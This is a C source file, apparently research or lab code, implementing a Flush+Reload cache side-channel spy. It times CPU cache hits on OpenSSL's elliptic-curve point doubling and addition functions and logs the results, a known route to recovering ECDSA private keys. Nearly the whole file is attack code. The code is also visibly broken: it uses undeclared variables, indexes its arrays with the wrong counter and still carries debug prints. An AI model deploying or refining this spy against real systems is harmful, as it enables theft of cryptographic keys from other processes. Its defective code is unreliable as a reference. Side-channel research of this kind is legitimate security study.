//Import 
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 199309L // For POSIX timer
#include <sched.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <semaphore.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <sys/time.h>
#include <syscall.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include "ec_lcl.h"
#include <sys/mman.h>

#include <openssl/ec.h>   
#include <openssl/ecdsa.h> 
#include <openssl/obj_mac.h>


inline void clflush(volatile void *p)
{
    asm volatile ("clflush (%0)" :: "r"(p));
}

bool probe(char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    " mfence              \n"
    " lfence              \n"
    " rdtsc               \n"
    " lfence              \n"
    " movl %%eax, %%esi \n"
    " movl (%1), %%eax     \n"
    " lfence              \n"
    " rdtsc               \n"
    " subl %%esi, %%eax \n"
    " clflush 0(%1)       \n"
    : "=a" (time)
    : "c" (adrs)
    : "%esi", "%edx");
  return time<100 ? 1:0 ;
}



void main()
{
	printf("\n Here 111111111");
	char *d,*a;
	unsigned long proberesult_d,proberesult_a;
	
	bool values1[MAX_COUNT/NUM_THREADS]={0};
	bool values2[MAX_COUNT/NUM_THREADS]={0};
		
	for(ii=0;ii<MAX_COUNT/NUM_THREADS;ii++)
	{
		values1[ii]=0;
		values2[ii]=0;			
	}
	
	d = ((char *)(&ec_GFp_simple_dbl));
	a = ((char *)(&ec_GFp_simple_add));
	
	// Bringing into cache
		sum+=(*d);
		sum+=(*a);
		
		// Flush from cache
		clflush((void *)d);
		clflush((void *)a);
		cpu_set_t my_set;        
		CPU_ZERO(&my_set);       
		CPU_SET(2, &my_set);     
		sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
		struct timespec ts;
		int changed_shared_variable_access_count[10000];
		int i;
	for(int i=0;i<10000;i++)
	{
		changed_shared_variable_access_count[counter]=*access_count;
		proberesult_d = probe(d);					 
		proberesult_a = probe(a);	
		values1[counter] = proberesult_d;
		values2[counter] = proberesult_a;
		
		ts.tv_sec = 0;
		ts.tv_nsec = 1000;
		nanosleep(&ts, NULL);
		// i is round of flush + reload
		
		
	}
	FILE *fp1,*fp2;		
	
	fp1=fopen("probe1.txt","a");
	fp2=fopen("probe2.txt","a");
	int counter;
			//printf("\n print val for %d counter value %d acesss_count here %d\n",tid,MAX_COUNT/NUM_THREADS,*access_count);
			for(counter=0;counter<10000;counter++)
			{
				fprintf(fp2,"%5ld,%5ld,%5d,%5d\n",counter,changed_shared_variable_access_count[counter],values1[counter],values2[counter]);
				if( values1[counter] || values2[counter])
					fprintf(fp1,"%5ld,%5ld,%5d,%5d\n",counter,changed_shared_variable_access_count[counter],values1[counter],values2[counter]);
			}
			fclose(fp1);
			fclose(fp2);
			
	printf("\nHere 222222 ");
}
